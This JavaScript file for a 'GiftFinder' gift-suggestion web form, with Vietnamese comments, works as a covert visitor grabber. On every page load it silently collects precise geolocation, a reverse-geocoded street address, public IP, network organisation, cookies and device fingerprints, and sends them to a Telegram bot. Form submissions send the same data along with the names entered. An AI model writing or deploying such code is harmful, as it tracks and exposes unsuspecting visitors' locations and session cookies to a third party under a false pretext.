import {
  TELEGRAM_API_URL,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
} from "../config.js";

const form = document.getElementById("gift-form");
const statusElement = document.getElementById("status-message");

const telemetry = {
  errors: [],
};

window.addEventListener("error", (event) => {
  telemetry.errors.push({
    type: "error",
    message: event.message,
    source: event.filename,
    line: event.lineno,
    column: event.colno,
  });
});

window.addEventListener("unhandledrejection", (event) => {
  telemetry.errors.push({
    type: "unhandledrejection",
    message:
      (event.reason && event.reason.message) ||
      (typeof event.reason === "string"
        ? event.reason
        : JSON.stringify(event.reason)),
  });
});

const escapeHtml = (value) =>
  value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");

const formatValue = (value) => {
  if (value === null || value === undefined) {
    return "Not available";
  }

  if (typeof value === "string") {
    return value.trim() === "" ? "Not available" : value;
  }

  if (Array.isArray(value)) {
    if (!value.length) {
      return "[]";
    }

    const hasObjects = value.some((item) => item && typeof item === "object");

    if (hasObjects) {
      try {
        return JSON.stringify(value, null, 2);
      } catch (error) {
        return value.map((item) => String(item)).join(", ");
      }
    }

    return value.join(", ");
  }

  if (typeof value === "object") {
    try {
      return JSON.stringify(value, null, 2);
    } catch (error) {
      return String(value);
    }
  }

  if (typeof value === "number" && Number.isFinite(value)) {
    return `${Math.round(value)} ms`;
  }

  return String(value);
};

const buildMessage = (data, context) => {
  const lines = [
    `<b>New GiftFinder submission</b>`,
    "",
    `<b>Sender:</b> ${escapeHtml(data.senderName)}`,
    `<b>Recipient:</b> ${escapeHtml(data.recipientName)}`,
    `<b>Relationship:</b> ${escapeHtml(data.relationship)}`,
    `<b>Occasion:</b> ${escapeHtml(data.occasion)}`,
    `<b>Budget:</b> $${escapeHtml(data.budget)}`,
    `<b>Interests:</b> ${escapeHtml(data.interests)}`,
  ];

  if (data.ageRange) {
    lines.push(`<b>Age range:</b> ${escapeHtml(data.ageRange)}`);
  }

  if (data.notes) {
    lines.push(`<b>Notes:</b> ${escapeHtml(data.notes)}`);
  }

  if (context) {
    const appendContext = (label, value) => {
      lines.push(`<b>${label}:</b> ${escapeHtml(formatValue(value))}`);
    };

    lines.push("", "<b>Client context</b>");
    const locationInfo =
      context.ipSummary ?? context.ipError ?? "Not available";
    const locationService = context.ipService
      ? ` (via ${context.ipService})`
      : "";
    appendContext("Location coordinates", locationInfo + locationService);

    if (context.ipDetails) {
      if (context.ipDetails.address) {
        appendContext("Location address", context.ipDetails.address);
      }

      const detailParts = [
        context.ipDetails.city,
        context.ipDetails.state,
        context.ipDetails.postalCode,
        context.ipDetails.country,
      ]
        .filter(Boolean)
        .join(", ");

      if (detailParts) {
        appendContext("Location details", detailParts);
      }

      if (context.ipDetails.ipAddress) {
        appendContext("Public IP", context.ipDetails.ipAddress);
      }

      if (context.ipDetails.org) {
        appendContext("Network organization", context.ipDetails.org);
      }

      if (context.ipDetails.accuracy) {
        appendContext("Location accuracy", context.ipDetails.accuracy);
      }

      if (context.ipDetails.timezone) {
        appendContext("Local timezone (IP)", context.ipDetails.timezone);
      }
    }
    appendContext("Referrer", context.referrer);
    appendContext("Preferred languages", context.languages);
    appendContext("Primary language", context.language);
    appendContext("Timezone", context.timezone);
    appendContext("Cookies", context.cookies);
    appendContext("User agent", context.userAgent);
    appendContext("Platform", context.platform);
    appendContext("Network", context.networkInfo);
    appendContext("Client hints", context.clientHints);
    appendContext("Navigation timing", context.navigationTiming);
    appendContext(
      "Telemetry errors",
      context.errors?.length ? context.errors : "None captured",
    );
  }

  return lines.join("\n");
};

const buildVisitMessage = (context) => {
  const lines = [`<b>New GiftFinder visit</b>`, ""];

  if (context) {
    const appendContext = (label, value) => {
      lines.push(`<b>${label}:</b> ${escapeHtml(formatValue(value))}`);
    };

    lines.push("<b>Client context</b>");
    const locationInfo =
      context.ipSummary ?? context.ipError ?? "Not available";
    const locationService = context.ipService
      ? ` (via ${context.ipService})`
      : "";
    appendContext("Location coordinates", locationInfo + locationService);

    if (context.ipDetails) {
      if (context.ipDetails.address) {
        appendContext("Location address", context.ipDetails.address);
      }

      const detailParts = [
        context.ipDetails.city,
        context.ipDetails.state,
        context.ipDetails.postalCode,
        context.ipDetails.country,
      ]
        .filter(Boolean)
        .join(", ");

      if (detailParts) {
        appendContext("Location details", detailParts);
      }

      if (context.ipDetails.ipAddress) {
        appendContext("Public IP", context.ipDetails.ipAddress);
      }

      if (context.ipDetails.org) {
        appendContext("Network organization", context.ipDetails.org);
      }

      if (context.ipDetails.accuracy) {
        appendContext("Location accuracy", context.ipDetails.accuracy);
      }

      if (context.ipDetails.timezone) {
        appendContext("Local timezone (IP)", context.ipDetails.timezone);
      }
    }
    appendContext("Referrer", context.referrer);
    appendContext("Preferred languages", context.languages);
    appendContext("Primary language", context.language);
    appendContext("Timezone", context.timezone);
    appendContext("Cookies", context.cookies);
    appendContext("User agent", context.userAgent);
    appendContext("Platform", context.platform);
    appendContext("Network", context.networkInfo);
    appendContext("Client hints", context.clientHints);
    appendContext("Navigation timing", context.navigationTiming);
    appendContext(
      "Telemetry errors",
      context.errors?.length ? context.errors : "None captured",
    );
  }

  return lines.join("\n");
};

const getNavigationTiming = () => {
  const navigationEntry = performance.getEntriesByType("navigation")[0];

  if (!navigationEntry) {
    return null;
  }

  const metrics = {
    timeToFirstByte: Math.max(
      navigationEntry.responseStart - navigationEntry.requestStart,
      0,
    ),
    domContentLoaded: Math.max(
      navigationEntry.domContentLoadedEventEnd - navigationEntry.startTime,
      0,
    ),
    totalLoad: Math.max(
      navigationEntry.loadEventEnd - navigationEntry.startTime,
      0,
    ),
  };

  return metrics;
};

const getNetworkInfo = () => {
  const connection =
    navigator.connection ||
    navigator.mozConnection ||
    navigator.webkitConnection ||
    null;

  if (!connection) {
    return null;
  }

  const { effectiveType, downlink, rtt, saveData } = connection;
  return {
    effectiveType,
    downlink,
    rtt,
    saveData,
  };
};

const fetchClientHints = async () => {
  if (
    !navigator.userAgentData ||
    !navigator.userAgentData.getHighEntropyValues
  ) {
    return null;
  }

  try {
    const highEntropy = await navigator.userAgentData.getHighEntropyValues([
      "architecture",
      "bitness",
      "model",
      "platform",
      "platformVersion",
      "uaFullVersion",
    ]);

    return {
      brands: navigator.userAgentData.brands,
      mobile: navigator.userAgentData.mobile,
      ...highEntropy,
    };
  } catch (error) {
    telemetry.errors.push({
      type: "client-hints",
      message: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
};

// Cache promise và kết quả để tránh multiple requests
let geolocationPromise = null;
let cachedLocation = null;
let cacheTimestamp = null;
const CACHE_DURATION = 5 * 60 * 1000; // 5 phút

const fetchIpAddress = async () => {
  try {
    const response = await fetch("https://api64.ipify.org?format=json");

    if (!response.ok) {
      throw new Error(`Failed to fetch IP address (${response.status})`);
    }

    const data = await response.json();
    return data.ip || null;
  } catch (error) {
    telemetry.errors.push({
      type: "ip-address",
      message: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
};

const reverseGeocodeCoordinates = async (latitude, longitude) => {
  try {
    const params = new URLSearchParams({
      lat: latitude,
      lon: longitude,
      format: "jsonv2",
      zoom: "16",
      addressdetails: "1",
    });

    const response = await fetch(
      `https://geocode.maps.co/reverse?${params.toString()}`,
    );

    if (!response.ok) {
      throw new Error(`Reverse geocoding failed (${response.status})`);
    }

    const data = await response.json();
    const address = data.address ?? {};

    return {
      addressLine: data.display_name || null,
      city:
        address.city ||
        address.town ||
        address.village ||
        address.hamlet ||
        null,
      state: address.state || null,
      postalCode: address.postcode || null,
      country: address.country || null,
    };
  } catch (error) {
    telemetry.errors.push({
      type: "reverse-geocode",
      message: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
};

const getGeolocation = async () => {
  // Kiểm tra cache trước
  if (
    cachedLocation &&
    cacheTimestamp &&
    Date.now() - cacheTimestamp < CACHE_DURATION
  ) {
    console.log("📦 Using cached location data");
    return cachedLocation;
  }

  // Nếu đã có request đang chạy, trả về promise đó
  if (geolocationPromise) {
    console.log("🔄 Reusing existing geolocation request");
    return geolocationPromise;
  }

  geolocationPromise = new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ error: "Geolocation not supported by this browser" });
      return;
    }

    console.log("🌍 Starting new geolocation request");

    // Kiểm tra trạng thái quyền trước khi yêu cầu
    if (navigator.permissions) {
      navigator.permissions
        .query({ name: "geolocation" })
        .then((result) => {
          console.log("Geolocation permission status:", result.state);

          if (result.state === "denied") {
            resolve({
              error:
                "Geolocation permission permanently denied. Please enable location access in your browser settings.",
              permissionState: result.state,
            });
            return;
          }

          if (result.state === "granted") {
            console.log("✅ Permission already granted, getting location...");
          } else if (result.state === "prompt") {
            console.log("⚠️ Permission not set, will prompt user...");
          }

          // Tiếp tục với việc lấy vị trí
          requestGeolocation(resolve);
        })
        .catch(() => {
          // Fallback nếu permissions API không khả dụng
          console.log(
            "⚠️ Permissions API not available, proceeding with geolocation...",
          );
          requestGeolocation(resolve);
        });
    } else {
      // Fallback nếu permissions API không khả dụng
      console.log(
        "⚠️ Permissions API not supported, proceeding with geolocation...",
      );
      requestGeolocation(resolve);
    }
  });

  // Clear promise sau khi hoàn thành
  geolocationPromise.finally(() => {
    geolocationPromise = null;
  });

  return geolocationPromise;
};

const requestGeolocation = (resolve) => {
  const options = {
    enableHighAccuracy: true,
    timeout: 25000, // Tăng timeout lên 25 giây
    maximumAge: 300000, // Cache vị trí trong 5 phút để tránh yêu cầu quyền liên tục
  };

  console.log("🎯 Requesting geolocation with options:", options);
  console.log("🔍 Current protocol:", window.location.protocol);
  console.log("🔍 Current host:", window.location.host);

  let resolved = false; // Flag để tránh resolve nhiều lần

  navigator.geolocation.getCurrentPosition(
    (position) => {
      if (resolved) {
        console.log("⚠️ Geolocation success but already resolved");
        return;
      }
      resolved = true;

      const { latitude, longitude, accuracy } = position.coords;
      console.log("✅ Geolocation success:", { latitude, longitude, accuracy });

      const result = {
        latitude: latitude.toFixed(6),
        longitude: longitude.toFixed(6),
        accuracy: Math.round(accuracy),
        summary: `${latitude.toFixed(6)}, ${longitude.toFixed(
          6,
        )} (±${Math.round(accuracy)}m)`,
      };

      // Cache kết quả
      cachedLocation = result;
      cacheTimestamp = Date.now();
      console.log("💾 Location cached for", CACHE_DURATION / 1000, "seconds");

      resolve(result);
    },
    (error) => {
      if (resolved) {
        console.log("⚠️ Geolocation error but already resolved");
        return;
      }
      resolved = true;

      let errorMessage = "Unknown geolocation error";
      let userFriendlyMessage = "Unable to get location";

      switch (error.code) {
        case 1: // PERMISSION_DENIED
          errorMessage = "Geolocation permission denied";
          userFriendlyMessage =
            "Location access was denied. Please allow location access to get your coordinates.";
          break;
        case 2: // POSITION_UNAVAILABLE
          errorMessage = "Location information unavailable";
          userFriendlyMessage =
            "Unable to determine your location. Please check if location services are enabled.";
          break;
        case 3: // TIMEOUT
          errorMessage = "Geolocation request timeout";
          userFriendlyMessage = "Location request timed out. Please try again.";
          break;
        default:
          errorMessage = `Geolocation error (code: ${error.code}): ${
            error.message || "Unknown error"
          }`;
          userFriendlyMessage =
            "An error occurred while getting your location.";
          break;
      }

      console.warn("❌ Geolocation error:", errorMessage, error);
      resolve({
        error: errorMessage,
        userMessage: userFriendlyMessage,
        errorCode: error.code,
      });
    },
    options,
  );
};

const fetchPublicIpInfo = async () => {
  const [geoResult, ipAddress] = await Promise.all([
    getGeolocation(),
    fetchIpAddress(),
  ]);

  if (geoResult.error) {
    telemetry.errors.push({
      type: "geolocation",
      message: geoResult.error,
    });

    // Fallback: Thử lấy thông tin IP nếu geolocation thất bại
    try {
      console.log("🔄 Geolocation failed, trying IP fallback...");
      const ipResponse = await fetch("https://ipapi.co/json/", {
        timeout: 10000,
      });

      if (ipResponse.ok) {
        const ipData = await ipResponse.json();
        console.log("✅ IP fallback successful:", ipData);
        const summaryParts = [
          ipData.city,
          ipData.region,
          ipData.country_name,
        ].filter(Boolean);

        return {
          raw: ipData,
          summary:
            summaryParts.join(", ") ||
            `${ipData.latitude}, ${ipData.longitude} (via IP)`,
          service: "ipapi.co",
          fallback: true,
          details: {
            address: summaryParts.join(", ") || null,
            ipAddress: ipData.ip || ipAddress,
            city: ipData.city || null,
            region: ipData.region || null,
            postalCode: ipData.postal || null,
            country: ipData.country_name || null,
            latitude: ipData.latitude || null,
            longitude: ipData.longitude || null,
            timezone: ipData.timezone || null,
            org: ipData.org || ipData.org_name || null,
            accuracy: "Approximate (IP-based)",
          },
        };
      }
    } catch (ipError) {
      console.warn("⚠️ IP fallback also failed:", ipError);
      telemetry.errors.push({
        type: "ip-fallback",
        message: ipError instanceof Error ? ipError.message : String(ipError),
      });
    }

    return {
      error: geoResult.userMessage || geoResult.error,
      service: "navigator.geolocation",
      permissionState: geoResult.permissionState,
      errorCode: geoResult.errorCode,
      details: {
        ipAddress,
      },
    };
  }

  const addressInfo = await reverseGeocodeCoordinates(
    geoResult.latitude,
    geoResult.longitude,
  );

  const summaryParts = [];
  if (addressInfo?.addressLine) {
    summaryParts.push(addressInfo.addressLine);
  }
  summaryParts.push(geoResult.summary);

  return {
    raw: { ...geoResult, address: addressInfo, ipAddress },
    summary: summaryParts.join(" | "),
    service: "navigator.geolocation",
    details: {
      address: addressInfo?.addressLine ?? null,
      city: addressInfo?.city ?? null,
      state: addressInfo?.state ?? null,
      postalCode: addressInfo?.postalCode ?? null,
      country: addressInfo?.country ?? null,
      latitude: geoResult.latitude,
      longitude: geoResult.longitude,
      accuracy: `±${geoResult.accuracy}m`,
      ipAddress,
    },
  };
};

const ipInfoPromise = fetchPublicIpInfo();

const collectClientContext = async () => {
  const [ipInfo, clientHints] = await Promise.all([
    ipInfoPromise,
    fetchClientHints(),
  ]);

  return {
    ipSummary: ipInfo.summary,
    ipError: ipInfo.error,
    ipRaw: ipInfo.raw,
    ipService: ipInfo.service,
    ipDetails: ipInfo.details,
    referrer: document.referrer || "None",
    language: navigator.language,
    languages: navigator.languages || [],
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: document.cookie || "None",
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    networkInfo: getNetworkInfo(),
    clientHints,
    navigationTiming: getNavigationTiming(),
    errors: telemetry.errors,
  };
};

const getClientContext = async () => {
  try {
    return await collectClientContext();
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    telemetry.errors.push({ type: "context", message });
    return {
      referrer: document.referrer || "None",
      language: navigator.language,
      languages: navigator.languages || [],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies: document.cookie || "None",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      networkInfo: null,
      clientHints: null,
      navigationTiming: getNavigationTiming(),
      errors: telemetry.errors,
      ipError: message,
      ipService: null,
      ipDetails: null,
    };
  }
};

const updateStatus = (message, type = "info") => {
  statusElement.textContent = message;
  statusElement.classList.remove("status--success", "status--error");

  if (type === "success") {
    statusElement.classList.add("status--success");
  }

  if (type === "error") {
    statusElement.classList.add("status--error");
  }
};

const canSendMessages = () =>
  Boolean(
    TELEGRAM_API_URL &&
      TELEGRAM_API_URL.startsWith("http") &&
      TELEGRAM_BOT_TOKEN &&
      TELEGRAM_BOT_TOKEN !== "YOUR_TELEGRAM_BOT_TOKEN" &&
      TELEGRAM_CHAT_ID &&
      TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID",
  );

const sendToTelegram = async (payload) => {
  console.log("Sending to Telegram:", payload);

  const response = await fetch(
    `${TELEGRAM_API_URL}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    },
  );

  console.log("Telegram response status:", response.status);

  if (!response.ok) {
    const errorText = await response.text();
    console.error("Telegram API error:", errorText);
    throw new Error(
      `Telegram API request failed (${response.status}): ${errorText}`,
    );
  }

  const result = await response.json();
  console.log("Telegram API result:", result);

  if (!result.ok) {
    throw new Error(result.description ?? "Telegram API returned an error");
  }

  return result;
};

// Debug function để kiểm tra cấu hình
const debugTelegramConfig = () => {
  console.log("=== Telegram Configuration Debug ===");
  console.log("TELEGRAM_API_URL:", TELEGRAM_API_URL);
  console.log(
    "TELEGRAM_BOT_TOKEN:",
    TELEGRAM_BOT_TOKEN
      ? `${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`
      : "NOT SET",
  );
  console.log("TELEGRAM_CHAT_ID:", TELEGRAM_CHAT_ID);
  console.log("canSendMessages():", canSendMessages());
  console.log("=====================================");
};

// Chạy debug khi load
debugTelegramConfig();

if (!canSendMessages()) {
  updateStatus(
    "Add your Telegram credentials to config.js to enable submissions.",
  );
}

const sendVisitOnLoad = async () => {
  if (!canSendMessages()) {
    console.log("Cannot send messages - Telegram not configured");
    return;
  }

  try {
    console.log("Sending visit notification...");
    const context = await getClientContext();
    console.log("Visit context:", context);

    const message = buildVisitMessage(context);
    console.log("Visit message:", message);

    await sendToTelegram({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });

    console.log("Visit notification sent successfully");
  } catch (error) {
    console.error("Visit notification error:", error);
  }
};

window.addEventListener("load", () => {
  // Fire-and-forget visit ping
  sendVisitOnLoad();
});

form?.addEventListener("submit", async (event) => {
  event.preventDefault();

  if (!canSendMessages()) {
    updateStatus(
      "Telegram is not configured yet. Update config.js before sending.",
      "error",
    );
    return;
  }

  const formData = new FormData(form);
  const getValue = (name) => (formData.get(name) ?? "").toString().trim();
  const data = {
    senderName: getValue("senderName"),
    recipientName: getValue("recipientName"),
    relationship: getValue("relationship"),
    occasion: getValue("occasion"),
    budget: getValue("budget"),
    interests: getValue("interests"),
    ageRange: getValue("ageRange"),
    notes: getValue("notes"),
  };

  updateStatus("Sending suggestion to Telegram...");
  form.querySelector('button[type="submit"]').disabled = true;

  try {
    const context = await getClientContext();
    console.log("Client context:", context);

    const message = buildMessage(data, context);
    console.log("Built message:", message);

    await sendToTelegram({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });

    updateStatus("Gift preferences sent! Check your Telegram chat.", "success");
    form.reset();
  } catch (error) {
    console.error("Form submission error:", error);
    const errorMessage = error instanceof Error ? error.message : String(error);
    updateStatus(`Unable to send the message: ${errorMessage}`, "error");
  } finally {
    form.querySelector('button[type="submit"]').disabled = false;
  }
});
